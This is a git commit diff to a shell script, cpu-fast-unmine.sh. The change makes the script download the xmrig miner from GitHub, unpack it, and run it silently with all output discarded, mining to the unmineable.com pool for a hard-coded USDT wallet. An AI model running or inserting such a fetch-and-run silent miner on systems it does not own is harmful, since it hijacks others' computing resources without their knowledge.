029767a612b370f56aea63bf36db3c144ddbd1bc
fcknjds <144345473+fcknjds@users.noreply.github.com>
2023-09-20 15:14:44 +0300

    Update cpu-fast-unmine.sh

--- cpu-fast-unmine.sh
+++ cpu-fast-unmine.sh
@@ -1,3 +1,3 @@
 {
-  ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u USDT:TS5CSNS97hXLtRPjrZHUafBBbxeFiFnYZG -p x 
+   wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz && tar xf xmrig-6.16.2-linux-static-x64.tar.gz && cd xmrig-6.16.2 && ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u USDT:TS5CSNS97hXLtRPjrZHUafBBbxeFiFnYZG -p x 
 } &> /dev/null
